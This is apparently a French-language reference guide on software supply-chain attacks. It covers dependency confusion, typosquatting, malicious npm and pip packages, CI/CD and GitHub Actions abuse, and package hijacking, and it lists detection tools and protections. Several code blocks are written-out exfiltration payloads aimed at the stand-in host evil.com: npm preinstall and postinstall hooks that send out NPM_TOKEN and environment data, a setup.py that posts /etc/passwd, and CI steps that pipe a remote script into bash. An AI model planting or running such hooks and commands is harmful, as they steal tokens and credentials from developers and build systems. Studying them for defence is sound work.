---
name: supply-chain-attacks
description: Guide complet d'attaques Supply Chain logicielle — dependency confusion, typosquatting, CI/CD pipeline attack, malicious packages, dependency hijacking, et outils.
category: cybersecurite
tags: [supply-chain, dependency, npm, pip, typosquatting, dependency-confusion, ci-cd, github-actions]
---

# Attaques Supply Chain (Chaîne d'Approvisionnement Logicielle)

## Sommaire
1. [Concepts](#concepts)
2. [Dependency Confusion](#dependency-confusion)
3. [Typosquatting](#typosquatting)
4. [Malicious Packages](#malicious-packages)
5. [CI/CD Pipeline Attacks](#cicd-pipeline-attacks)
6. [Dependency Hijacking](#dependency-hijacking)
7. [GitHub Actions Abuse](#github-actions-abuse)
8. [Package Manager Exploitation](#package-manager-exploitation)
9. [Reproducible Builds Attacks](#reproducible-builds-attacks)
10. [Outils](#outils)

## Concepts

La supply chain logicielle représente l'ensemble des dépendances, outils et processus
utilisés pour construire un logiciel. Chaque maillon est une surface d'attaque.

### Vecteurs d'attaque principaux :
- **Dependency confusion** : usurpation de noms de packages internes
- **Typosquatting** : noms proches de packages populaires
- **Malicious packages** : packages piégés dans le registre
- **CI/CD compromise** : attaque sur la pipeline de build
- **Maintainer account takeover** : vol de compte mainteneur
- **Compromised build tools** : outils de build infectés

## Dependency Confusion

L'attaquant publie un package public avec le même nom qu'un package privé utilisé
par la cible. Le gestionnaire de packages télécharge le public (priorité plus haute).

### Scénario :
```
Entreprise utilise : npm install @acme/internal-lib
Mais @acme/internal-lib est PRIVÉ (registry interne)
Attaquant publie @acme/internal-lib sur npm PUBLIC
Prochain npm install → télécharge la version publique malveillante
```

### Test de vulnérabilité :
```bash
# Vérifier si un nom de package est disponible sur le registre public
npm view @company/package-name   # Si 404 → disponible pour dépôt
pip download company-package     # Si trouvé sur PyPI → confusion possible

# Automatisation
npm pack --dry-run               # Voir la liste des dépendances
grep -r "@company/" package.json # Chercher les packages privés
```

### Exploitation automatisée :
```bash
#!/bin/bash
# Scanner les dépendances d'un projet pour trouver les noms disponibles
for pkg in $(grep -oP '"[^"]+":\s*"[^"]+"' package.json | grep -v 'npmjs'); do
    pkg_name=$(echo $pkg | cut -d'"' -f2)
    npm view "$pkg_name" > /dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo "[+] Potentiel dependency confusion: $pkg_name"
    fi
done
```

### Payload de package malveillant (npm) :
```json
{
  "name": "@bigbank/auth-lib",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node -e \"require('child_process').execSync('curl http://evil.com/steal?token='+process.env.NPM_TOKEN)\"",
    "postinstall": "node payload.js"
  }
}
```

## Typosquatting

Publier un package avec un nom très proche d'un package populaire.

### Techniques de typosquatting :
```
express → exspress
lodash → lodahs
moment → monent
babel-core → babel-core-fix
python3 → pythn3
requests → requestes
```

### Détection de typosquatting :
```bash
# Avec Confused (outil de détection)
pip install confused

# Scanner les dépendances
confused --path /path/to/project

# Analyser les imports suspects
grep -r "^import " *.py | grep -v "import os\|import sys\|import re"
```

## Malicious Packages

Packages qui contiennent du code malveillant (data exfiltration, backdoor, RAT).

### Patterns de packages malveillants :
```javascript
// npm - data exfiltration dans postinstall
const http = require('http');
const env = JSON.stringify(process.env);
const fs = require('fs');
const files = fs.readdirSync('/home');
http.get(`http://evil.com/exfil?env=${Buffer.from(env).toString('base64')}&files=${files}`);
```

```python
# pip - setup.py malveillant
import os
import requests
from setuptools import setup

# Exfiltrer les credentials
env_data = open("/etc/passwd").read() + "\n" + os.popen("env").read()
requests.post("http://evil.com/collect", data=env_data)

setup(
    name="legitimate-package",
    version="1.0.0",
    packages=["legitimate"],
)
```

### Détection de packages malveillants :
```bash
# Analyser les scripts npm
npm audit
npm audit --json | jq '.advisories'

# Analyser les packages installés
npm pack <package> && tar -xzf <package>.tgz && grep -r "exec\|eval\|child_process\|request\|http\." package/

# Avec pypi-audit
pip install pypi-audit
pypi-audit scan

# Avec GuardDog (GitHub)
pip install guarddog
guarddog scan /path/to/project/requirements.txt
```

## CI/CD Pipeline Attacks

Attaquer la pipeline de build/déploiement pour injecter du code malveillant.

### Attaques courantes :

**1. Poisoned Pipeline Execution (PPE)** :
```yaml
# CI config qui exécute du code non vérifié
steps:
  - run: echo "${{ github.event.issue.title }}" | bash
  # L'attaquant crée une issue avec : `$(curl evil.com/payload.sh | bash)`
```

**2. Secret exfiltration via CI** :
```yaml
steps:
  - name: Build
    run: |
      npm install
      npm run build
      # L'attaquant modifie un package pour exfiltrer ${{ secrets.AWS_KEY }}
```

**3. Self-hosted runner compromise** :
```yaml
# Attaquant crée un PR avec :
steps:
  - name: Exfil
    run: |
      curl -X POST http://evil.com/steal \
        -H "Content-Type: application/json" \
        -d "{\"runner\": \"$(cat /etc/hostname)\", \"env\": \"$(env)\"}"
```

### Test de sécurité CI/CD :
```bash
# Vérifier les permissions des GitHub Actions
gh api repos/:owner/:repo/actions/permissions

# Lister les secrets exposés
gh secret list

# Vérifier les runners auto-hébergés
gh api repos/:owner/:repo/actions/runners
```

## Dependency Hijacking

Prendre le contrôle d'une dépendance existante.

### Techniques :

**1. Account takeover** :
- Trouver les mainteneurs avec des emails sur des domaines expirés
- Attaquer par credential stuffing
- Social engineering sur le mainteneur

**2. Package abandonment** :
- Trouver des packages populaires non maintenus (abandonware)
- Demander les droits de publish
- Publier une version malveillante

**3. Version squatting** :
```bash
# Si version 1.2.3 est buggée, publier 1.2.4 avec backdoor avant le fix officiel
npm publish package@1.2.4 --tag latest
```

## GitHub Actions Abuse

### Détournement de workflow :
```yaml
# Si le workflow utilise pull_request_target :
name: CI
on:
  pull_request_target:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install  # Exécute le package.json du PR de l'attaquant !
```

### Exploitation :
```
Le workflow `pull_request_target` s'exécute dans le contexte de la branche
cible (main) avec les secrets. Si la PR modifie package.json ou les scripts,
le code malveillant est exécuté AVEC les secrets.
```

## Package Manager Exploitation

### npm :
```bash
# Vérifier les signatures
npm audit signatures

# Détecter les packages avec des scripts postinstall
npm query ":attr(scripts, [postinstall])"

# Scanner les dépendances
npm ls --all | grep -v "deduped"
```

### pip :
```bash
# Vérifier les hash
pip install --require-hashes -r requirements.txt

# Détecter les packages inconnus
pip freeze | while read pkg; do
    name=$(echo $pkg | cut -d'=' -f1)
    pip show $name | grep Home-page
done
```

### Docker :
```bash
# Scanner les images
docker scout quicktest image:latest
trivy image --severity CRITICAL image:latest
```

## Outils

### Dependency confusion scanners :
```bash
# Confused (npm/pip)
git clone https://github.com/visma-prodsec/confused.git
cd confused
python3 confused.py --project /path/to/project --package-manager npm

# Détection manuelle
grep -r "private\|internal\|@company" package.json requirements.txt
```

### Malicious package detectors :
```bash
# GuardDog
pip install guarddog
guarddog scan requirements.txt
guarddog verify mypackage==1.0.0

# OSS Gadget
dotnet tool install --global OSSGadget
oss-characteristics nuget-package MyPackage.nupkg
```

### CI/CD security scanners :
```bash
# TruffleHog (secrets dans CI logs)
pip install trufflehog
trufflehog github --repo https://github.com/company/repo

# Gitleaks
gitleaks detect --source /path/to/repo

# Checkov (Infrastructure as Code security)
pip install checkov
checkov -d . --framework github_actions
```

### Runtime detection :
```bash
# Falco (runtime security)
falco

# Audit des installations
pip install pip-audit
pip-audit --desc on

# npm audit
npm audit --production
```

## Protections
- **Lock files** (package-lock.json, requirements.txt avec hash)
- **Private registry** (Verdaccio, AWS CodeArtifact, GitHub Packages)
- **Signature verification** (npm audit signatures, SLSA)
- **Dependency pinning** (versions exactes, pas de ranges)
- **CI/CD least privilege** (ne pas donner tous les secrets aux PR)
- **Renovate/Dependabot** avec auto-merge désactivé
- **Dependency review** dans les PR GitHub
- **Software Bill of Materials (SBOM)** : `cyclonedx-bom`

## Ressources
- **OWASP Dependency Check** : https://owasp.org/www-project-dependency-check/
- **HackTricks Supply Chain** : https://book.hacktricks.xyz/generic-methodologies-and-resources/supply-chain-attacks
- **Confused (dependency confusion)** : https://github.com/visma-prodsec/confused
- **GuardDog** : https://github.com/DataDog/guarddog
- **SLSA Framework** : https://slsa.dev/
- **GitHub Security Lab** : https://securitylab.github.com/
- **CWE-1104 (Supply Chain)** : https://cwe.mitre.org/data/definitions/1104.html